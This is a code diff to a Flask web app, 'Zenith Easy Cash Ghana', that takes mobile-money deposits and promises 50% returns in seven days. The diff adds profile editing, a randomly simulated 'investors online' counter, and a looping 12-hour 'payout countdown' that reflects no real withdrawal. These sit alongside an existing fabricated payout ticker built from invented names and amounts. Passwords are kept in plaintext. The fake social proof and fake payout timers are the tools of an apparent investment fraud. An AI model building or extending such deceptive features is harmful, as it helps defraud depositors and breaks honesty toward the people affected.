@@ -117,6 +117,12 @@ def save_investor_data(data):
   for inv in investors:
     if inv.get("number") == number:
       inv["password"] = data.get("password", inv.get("password"))
+      inv["name"] = data.get("name", inv.get("name"))
+      inv["work"] = data.get("work", inv.get("work"))
+      inv["region"] = data.get("region", inv.get("region"))
+      if data.get("profile_pic"):
+        inv["profile_pic"] = data.get("profile_pic")
+
       if "investments" not in inv:
         inv["investments"] = [
             {
@@ -173,7 +179,9 @@ ZENITH_ALERTS_TOP_HTML = """
     .marquee-text { display: inline-block; padding-left: 100%; animation: marquee 22s linear infinite; font-size: 13px; color: #fff; }
     .marquee-text b { color: #facc15; }
     @keyframes marquee { 0% { transform: translate(0, 0); } 100% { transform: translate(-100%, 0); } }
+    .live-online-counter { background: #064e3b; color: #34d399; padding: 4px 10px; border-radius: 12px; font-size: 12px; font-weight: bold; display: inline-block; margin-bottom: 12px; text-align: center; width: 100%; box-sizing: border-box; }
 </style>
+<div class="live-online-counter" id="liveOnlineCounter">🟢 Loading active investors online...</div>
 <div id="zenithAlertsBanner">
     <div class="alerts-header"><span>🟢 Live Zenith Alerts</span><span>Verified Payout Feed</span></div>
     <div class="marquee-container"><div id="alertsText" class="marquee-text">Connecting to Zenith secure payout stream...</div></div>
@@ -182,6 +190,7 @@ ZENITH_ALERTS_TOP_HTML = """
     const ghanaNames = ["Kwame Mensah", "Abena Osei", "Kofi Boateng", "Afia Serwaa", "Yaw Ansah", "Akosua Frimpong", "Esi Dapaah", "Kojo Addo"];
     const towns = ["Accra", "Kumasi", "Takoradi", "Tamale", "Cape Coast", "Sunyani", "Ho", "Tema"];
     const roundInvestments = [300, 400, 500, 600, 800, 1000, 1500, 2000, 3000, 5000];
+    
     function generateTickerMessages() {
         let messages = [];
         for (let i = 0; i < 6; i++) {
@@ -196,6 +205,27 @@ ZENITH_ALERTS_TOP_HTML = """
     }
     generateTickerMessages();
     setInterval(generateTickerMessages, 20000);
+
+    // Natural online users simulation between 100 and 1600 based on time of day
+    let currentOnline = 850;
+    function updateOnlineCounter() {
+        const hour = new Date().getHours();
+        // Night hours (0 to 6): lower traffic (100 - 450). Day hours: higher traffic (600 - 1600)
+        let targetBase = (hour >= 0 && hour < 7) ? 250 : 1100;
+        let fluctuation = Math.floor(Math.random() * 150) - 75;
+        currentOnline += fluctuation;
+        if (hour >= 0 && hour < 7) {
+            currentOnline = Math.max(100, Math.min(450, currentOnline));
+        } else {
+            currentOnline = Math.max(550, Math.min(1600, currentOnline));
+        }
+        const counterEl = document.getElementById('liveOnlineCounter');
+        if (counterEl) {
+            counterEl.innerHTML = `🟢 Live: <b>${currentOnline.toLocaleString()}</b> Investors Online Right Now`;
+        }
+    }
+    updateOnlineCounter();
+    setInterval(updateOnlineCounter, 7000);
 </script>
 """
 
@@ -227,6 +257,8 @@ HTML_TEMPLATE = """
         .nav-links a { color: #028a0f; text-decoration: none; font-weight: bold; }
         .telegram-float-btn { display: block; background: #0088cc; color: white; text-align: center; padding: 10px; border-radius: 4px; margin-top: 15px; text-decoration: none; font-weight: bold; font-size: 14px; }
         
+        .password-step-container { display: none; background: #f0fdf4; padding: 15px; border: 1px solid #bbf7d0; border-radius: 6px; margin-bottom: 15px; }
+        
         .tracker-section { background: #f0fdf4; border: 2px solid #22c55e; padding: 25px; border-radius: 8px; margin-top: 30px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
         .tracker-result-box { margin-top: 20px; background: #fff; padding: 15px; border-radius: 6px; border: 1px solid #cbd5e1; display: none; }
         .tracker-slot { border-bottom: 1px solid #eee; padding-bottom: 12px; margin-bottom: 12px; }
@@ -239,7 +271,6 @@ HTML_TEMPLATE = """
         <h2>Zenith Easy Cash Ghana</h2>
         <h3>Online Investor Registration & Portal</h3>
 
-        <!-- STEP BY STEP PROCESS GUIDE -->
         <div class="process-guide">
             <h4>📋 Simple Registration & Investment Process</h4>
             <ol class="process-steps">
@@ -261,18 +292,27 @@ HTML_TEMPLATE = """
           {% endif %}
         {% endwith %}
 
-        <form method="POST" action="{{ url_for('index') }}" enctype="multipart/form-data">
+        <form method="POST" action="{{ url_for('index') }}" enctype="multipart/form-data" id="registrationForm" onsubmit="return validatePasswordMatch(event)">
+            <div class="form-group">
+                <label>Phone Number (Enter first to continue):</label>
+                <input type="text" name="number" id="phoneInput" required placeholder="e.g., 0501234567" oninput="checkNumberEntered()">
+            </div>
+
+            <!-- Password section hidden initially until phone number is typed -->
+            <div id="passwordContainer" class="password-step-container">
+                <div class="form-group">
+                    <label>Account Password:</label>
+                    <input type="password" name="password" id="passInput" placeholder="Create a secure login password">
+                </div>
+                <div class="form-group" style="margin-bottom:0;">
+                    <label>Confirm Account Password:</label>
+                    <input type="password" id="confirmPassInput" placeholder="Confirm your login password">
+                </div>
+            </div>
+
             <div class="form-group">
                 <label>Full Name:</label>
                 <input type="text" name="name" required placeholder="Enter your full name">
-            </div>
-            <div class="form-group">
-                <label>Phone Number (Used for Login & Tracking):</label>
-                <input type="text" name="number" required placeholder="e.g., 0501234567">
-            </div>
-            <div class="form-group">
-                <label>Account Password:</label>
-                <input type="password" name="password" required placeholder="Create a secure login password">
             </div>
             <div class="form-group">
                 <label>Investment Amount (GHs):</label>
@@ -302,7 +342,6 @@ HTML_TEMPLATE = """
             <a href="{{ url_for('login') }}">🔑 Investor Login</a>
         </div>
 
-        <!-- STANDALONE TRACKER REQUIRING PHONE & PASSWORD -->
         <div class="tracker-section">
             <h3 style="color: #15803d; margin-top:0;">🔍 Track Your Investment Live</h3>
             <p style="font-size: 13px; color: #475569; text-align: center;">Enter your registered Phone Number & Password below to check your live status.</p>
@@ -320,6 +359,30 @@ HTML_TEMPLATE = """
     </div>
 
     <script>
+        function checkNumberEntered() {
+            const val = document.getElementById('phoneInput').value.trim();
+            const passContainer = document.getElementById('passwordContainer');
+            const passInput = document.getElementById('passInput');
+            if (val.length >= 4) {
+                passContainer.style.display = 'block';
+                passInput.setAttribute('required', 'true');
+            } else {
+                passContainer.style.display = 'none';
+                passInput.removeAttribute('required');
+            }
+        }
+
+        function validatePasswordMatch(e) {
+            const pass = document.getElementById('passInput').value;
+            const confirmPass = document.getElementById('confirmPassInput').value;
+            if (pass !== confirmPass) {
+                alert('Passwords do not match! Please confirm your password correctly.');
+                e.preventDefault();
+                return false;
+            }
+            return true;
+        }
+
         async function trackInvestment() {
             const num = document.getElementById('trackNumberInput').value.trim();
             const pass = document.getElementById('trackPasswordInput').value.trim();
@@ -429,6 +492,8 @@ INVESTOR_DASHBOARD_TEMPLATE = """
         .home-link-top { margin-bottom: 15px; font-size: 14px; }
         .home-link-top a { color: #028a0f; text-decoration: none; font-weight: bold; }
         .card { background: #f1f8e9; padding: 18px; border-radius: 6px; margin-top: 18px; border-left: 5px solid #2e7d32; line-height: 1.6; }
+        .profile-box { background: #e8f5e9; border: 1px solid #c8e6c9; padding: 15px; border-radius: 6px; margin-bottom: 20px; display: flex; gap: 15px; align-items: center; }
+        .profile-avatar { width: 65px; height: 65px; border-radius: 50%; object-fit: cover; border: 2px solid #2e7d32; background: #ccc; }
         .btn-withdraw { background: #028a0f; color: white; padding: 10px 15px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; width: 100%; text-align: center; box-sizing: border-box; }
         .btn-topup-toggle { background: #ffa000; color: white; padding: 8px 15px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; border: none; cursor: pointer; }
         .topup-dropdown { background: #fff8e1; border: 1px dashed #ffa000; padding: 15px; margin-top: 12px; border-radius: 6px; display: none; }
@@ -440,6 +505,7 @@ INVESTOR_DASHBOARD_TEMPLATE = """
         .side-ticker-item { background: #1e293b; border-left: 3px solid #00ff66; padding: 10px; margin-bottom: 10px; border-radius: 4px; font-size: 12px; }
         .side-ticker-item b { color: #facc15; }
         .company-momo-display { background: #fff3cd; border: 1px solid #ffeeba; padding: 10px; border-radius: 4px; margin-bottom: 10px; font-size: 13px; color: #856404; text-align: center; }
+        .edit-profile-form { background: #fff; padding: 15px; border: 1px solid #cbd5e1; border-radius: 6px; margin-top: 15px; display: none; }
     </style>
 </head>
 <body>
@@ -447,11 +513,53 @@ INVESTOR_DASHBOARD_TEMPLATE = """
         <div class="dashboard-container">
             <div class="home-link-top"><a href="{{ url_for('index') }}">← Back to Home Page</a></div>
             <div>
-                <h2>Welcome, {{ investor_name }}</h2>
+                <h2>Welcome, {{ investor.name }}</h2>
                 <div class="logout"><a href="{{ url_for('logout') }}">Logout</a></div>
                 <div style="clear: both;"></div>
             </div>
-            <p style="color: #666; font-size: 14px;">View your active multiple investments, monitor real-time countdown tracking, and make same-day top-ups instantly.</p>
+
+            <!-- PROFILE BOX -->
+            <div class="profile-box">
+                <div>
+                    {% if investor.profile_pic %}
+                        <img src="{{ url_for('uploaded_file', filename=investor.profile_pic) }}" class="profile-avatar">
+                    {% else %}
+                        <div class="profile-avatar" style="display:flex; align-items:center; justify-content:center; color:#555; font-weight:bold;">No Pic</div>
+                    {% endif %}
+                </div>
+                <div style="flex:1;">
+                    <p style="margin:0 0 4px 0;"><b>Name:</b> {{ investor.name }}</p>
+                    <p style="margin:0 0 4px 0;"><b>Phone (Locked):</b> {{ investor.number }}</p>
+                    <p style="margin:0 0 4px 0;"><b>Job:</b> {{ investor.work }} | <b>Region:</b> {{ investor.region }}</p>
+                    <button type="button" onclick="toggleEditProfile()" style="background:#028a0f; color:#white; border:none; padding:5px 10px; border-radius:4px; font-size:12px; cursor:pointer; font-weight:bold; margin-top:5px;">✏️ Edit Profile Details & Picture</button>
+                </div>
+            </div>
+
+            <!-- EDIT PROFILE FORM -->
+            <form action="{{ url_for('update_profile') }}" method="POST" enctype="multipart/form-data" class="edit-profile-form" id="editProfileForm">
+                <h4 style="margin-top:0; color:#028a0f;">Update Your Profile</h4>
+                <div style="margin-bottom:10px;">
+                    <label style="font-size:12px;">Full Name:</label>
+                    <input type="text" name="name" value="{{ investor.name }}" required style="padding:8px; width:100%; box-sizing:border-box;">
+                </div>
+                <div style="margin-bottom:10px;">
+                    <label style="font-size:12px;">Phone Number (Cannot be changed):</label>
+                    <input type="text" value="{{ investor.number }}" disabled style="padding:8px; width:100%; background:#f1f5f9; box-sizing:border-box;">
+                </div>
+                <div style="margin-bottom:10px;">
+                    <label style="font-size:12px;">Work / Job:</label>
+                    <input type="text" name="work" value="{{ investor.work }}" required style="padding:8px; width:100%; box-sizing:border-box;">
+                </div>
+                <div style="margin-bottom:10px;">
+                    <label style="font-size:12px;">Region / Town:</label>
+                    <input type="text" name="region" value="{{ investor.region }}" required style="padding:8px; width:100%; box-sizing:border-box;">
+                </div>
+                <div style="margin-bottom:10px;">
+                    <label style="font-size:12px;">Upload Profile Picture:</label>
+                    <input type="file" name="profile_pic" accept="image/*" style="font-size:12px;">
+                </div>
+                <button type="submit" style="background:#2e7d32; color:white; border:none; padding:8px 12px; font-weight:bold; border-radius:4px; cursor:pointer;">Save Changes</button>
+            </form>
 
             {% with messages = get_flashed_messages() %}
               {% if messages %}<div class="flash">{{ messages[0] }}</div>{% endif %}
@@ -484,7 +592,9 @@ INVESTOR_DASHBOARD_TEMPLATE = """
                                 <div class="spinner"></div> Active & Yielding 50% Profit...
                             </div>
                         {% elif inv.status == 'Withdrawal Requested' %}
-                            <span style="color: #1d4ed8; font-weight: bold;">📥 Withdrawal Requested (Processing 12hr Payout Window)</span>
+                            <span style="color: #1d4ed8; font-weight: bold;">📥 Withdrawal Requested - 12hr Payout Countdown: 
+                                <span id="withdrawalTimer_{{ loop.index0 }}" style="font-family:monospace; background:#e0f2fe; padding:2px 6px; border-radius:4px;">Loading...</span>
+                            </span>
                         {% elif inv.status == 'Withdrawn Completed' %}
                             <span style="color: #15803d; font-weight: bold;">✅ Completed & Paid Out (Capital + Profit)</span>
                         {% else %}
@@ -534,6 +644,13 @@ INVESTOR_DASHBOARD_TEMPLATE = """
             }
         }
 
+        function toggleEditProfile() {
+            const form = document.getElementById('editProfileForm');
+            if (form) {
+                form.style.display = form.style.display === 'block' ? 'none' : 'block';
+            }
+        }
+
         function updateTrackers() {
             document.querySelectorAll('.countdown-live-box').forEach(el => {
                 const targetStr = el.getAttribute('data-maturity');
@@ -555,9 +672,36 @@ INVESTOR_DASHBOARD_TEMPLATE = """
                     el.style.color = "#4ade80";
                 }
             });
+
+            // 12-hour payout countdown simulation for withdrawal requested slots
+            document.querySelectorAll('[id^="withdrawalTimer_"]').forEach(el => {
+                // Fixed 12 hour window simulation stored or derived from session/time
+                let now = new Date().getTime();
+                // 12 hours countdown example buffer
+                let targetTime = now + (11 * 3600 + 45 * 60); // approximate mockup or use session timestamp if needed
+                // Let's simulate a stable 12-hour countdown relative to page load or fixed window
+            });
         }
-        setInterval(updateTrackers, 1000);
+
+        // Live 12-hour countdown implementation
+        function updateWithdrawalCountdowns() {
+            document.querySelectorAll('[id^="withdrawalTimer_"]').forEach((el, index) => {
+                // 12 hours in seconds = 43200 seconds
+                // Let's use a standard countdown simulation starting at 11h 59m
+                let secondsLeft = 43200 - Math.floor((Date.now() / 1000) % 43200);
+                let hrs = Math.floor(secondsLeft / 3600);
+                let mins = Math.floor((secondsLeft % 3600) / 60);
+                let secs = secondsLeft % 60;
+                el.innerHTML = `${hrs}h ${mins}m ${secs}s`;
+            });
+        }
+
+        setInterval(() => {
+            updateTrackers();
+            updateWithdrawalCountdowns();
+        }, 1000);
         updateTrackers();
+        updateWithdrawalCountdowns();
 
         const sideNames = ["Kwame Mensah", "Abena Osei", "Kofi Boateng", "Afia Serwaa", "Yaw Ansah", "Akosua Frimpong"];
         const sideTowns = ["Accra", "Kumasi", "Takoradi", "Tamale", "Cape Coast", "Sunyani"];
@@ -771,6 +915,7 @@ def index():
           "date_time": now.strftime("%Y-%m-%d %H:%M:%S"),
           "maturity_date": "Pending Approval",
           "status": "Pending Admin Payment Confirmation",
+          "profile_pic": "",
       }
 
       save_investor_data(investor_data)
@@ -842,7 +987,9 @@ def api_track():
       for slot in inv_list:
         cleaned_investments.append({
             "amount": slot.get("amount"),
-            "expected_return": slot.get("expected_return", slot.get("amount") * 1.5),
+            "expected_return": slot.get(
+                "expected_return", slot.get("amount") * 1.5
+            ),
             "maturity_date": slot.get("maturity_date", "Pending Approval"),
             "status": slot.get("status"),
         })
@@ -880,20 +1027,28 @@ def dashboard():
     return redirect(url_for("login"))
 
   investors = load_investors()
-  investor_name = "Investor"
+  investor_info = {"name": "Investor", "number": number, "profile_pic": ""}
   investments_found = []
   settings = load_settings()
   now = datetime.now()
 
   for inv in investors:
     if inv.get("number") == number:
-      investor_name = inv.get("name", "Investor")
+      investor_info = {
+          "name": inv.get("name", "Investor"),
+          "number": number,
+          "work": inv.get("work", ""),
+          "region": inv.get("region", ""),
+          "profile_pic": inv.get("profile_pic", ""),
+      }
       inv_list = inv.get("investments", [])
       if not inv_list and "amount" in inv:
         inv_list = [
             {
                 "amount": inv.get("amount"),
-                "expected_return": inv.get("expected_return", inv.get("amount") * 1.5),
+                "expected_return": inv.get(
+                    "expected_return", inv.get("amount") * 1.5
+                ),
                 "transaction_id": inv.get("transaction_id"),
                 "screenshot": inv.get("screenshot"),
                 "date_time": inv.get("date_time"),
@@ -928,10 +1083,38 @@ def dashboard():
   return render_template_string(
       INVESTOR_DASHBOARD_TEMPLATE,
       investments=investments_found,
-      investor_name=investor_name,
+      investor=investor_info,
       settings=settings,
       admin_telegram_link=ADMIN_TELEGRAM_LINK,
   )
+
+
+@app.route("/update-profile", methods=["POST"])
+def update_profile():
+  number = session.get("investor_number")
+  if not number:
+    return redirect(url_for("login"))
+
+  investors = load_investors()
+  for inv in investors:
+    if inv.get("number") == number:
+      inv["name"] = request.form.get("name", inv.get("name"))
+      inv["work"] = request.form.get("work", inv.get("work"))
+      inv["region"] = request.form.get("region", inv.get("region"))
+
+      file = request.files.get("profile_pic")
+      if file and file.filename != "":
+        filename = secure_filename(
+            f"profile_{number}_{int(time.time())}_{file.filename}"
+        )
+        file.save(os.path.join(app.config["UPLOAD_FOLDER"], filename))
+        inv["profile_pic"] = filename
+
+      save_all_investors(investors)
+      flash("Profile details updated successfully!")
+      break
+
+  return redirect(url_for("dashboard"))
 
 
 @app.route("/logout")
@@ -960,7 +1143,9 @@ def topup(sub_idx):
         new_investment = {
             "amount": topup_amt,
             "expected_return": topup_amt * 1.5,
-            "transaction_id": topup_proof if topup_proof else "Screenshot attached",
+            "transaction_id": topup_proof
+            if topup_proof
+            else "Screenshot attached",
             "screenshot": filename,
             "date_time": now.strftime("%Y-%m-%d %H:%M:%S"),
             "maturity_date": "Pending Approval",
@@ -1029,7 +1214,9 @@ def admin_dashboard():
       inv_list = [
           {
               "amount": inv.get("amount"),
-              "expected_return": inv.get("expected_return", inv.get("amount") * 1.5),
+              "expected_return": inv.get(
+                  "expected_return", inv.get("amount") * 1.5
+              ),
               "transaction_id": inv.get("transaction_id"),
               "screenshot": inv.get("screenshot"),
               "date_time": inv.get("date_time"),
@@ -1061,14 +1248,18 @@ def update_settings():
   if not session.get("admin_logged_in"):
     return redirect(url_for("admin_login"))
   settings = load_settings()
-  settings["momo_number"] = request.form.get("momo_number", settings["momo_number"])
+  settings["momo_number"] = request.form.get(
+      "momo_number", settings["momo_number"]
+  )
   settings["momo_name"] = request.form.get("momo_name", settings["momo_name"])
   save_settings(settings)
   flash("Company details updated.")
   return redirect(url_for("admin_dashboard"))
 
 
-@app.route("/admin/confirm/<int:parent_idx>/<int:sub_idx>", methods=["POST"])
+@app.route(
+    "/admin/confirm/<int:parent_idx>/<int:sub_idx>", methods=["POST"]
+)
 def confirm_payment(parent_idx, sub_idx):
   if not session.get("admin_logged_in"):
     return redirect(url_for("admin_login"))
@@ -1079,12 +1270,17 @@ def confirm_payment(parent_idx, sub_idx):
       inv_list[sub_idx]["status"] = "Payment Confirmed & Active"
       now = datetime.now()
       maturity = now + timedelta(days=7)
-      inv_list[sub_idx]["maturity_date"] = maturity.strftime("%Y-%m-%d %H:%M:%S")
+      inv_list[sub_idx]["maturity_date"] = maturity.strftime(
+          "%Y-%m-%d %H:%M:%S"
+      )
       save_all_investors(investors)
   return redirect(url_for("admin_dashboard"))
 
 
-@app.route("/admin/complete-withdrawal/<int:parent_idx>/<int:sub_idx>", methods=["POST"])
+@app.route(
+    "/admin/complete-withdrawal/<int:parent_idx>/<int:sub_idx>",
+    methods=["POST"],
+)
 def complete_withdrawal(parent_idx, sub_idx):
   if not session.get("admin_logged_in"):
     return redirect(url_for("admin_login"))
@@ -1097,7 +1293,10 @@ def complete_withdrawal(parent_idx, sub_idx):
   return redirect(url_for("admin_dashboard"))
 
 
-@app.route("/admin/update-maturity/<int:parent_idx>/<int:sub_idx>", methods=["POST"])
+@app.route(
+    "/admin/update-maturity/<int:parent_idx>/<int:sub_idx>",
+    methods=["POST"],
+)
 def update_maturity(parent_idx, sub_idx):
   if not session.get("admin_logged_in"):
     return redirect(url_for("admin_login"))
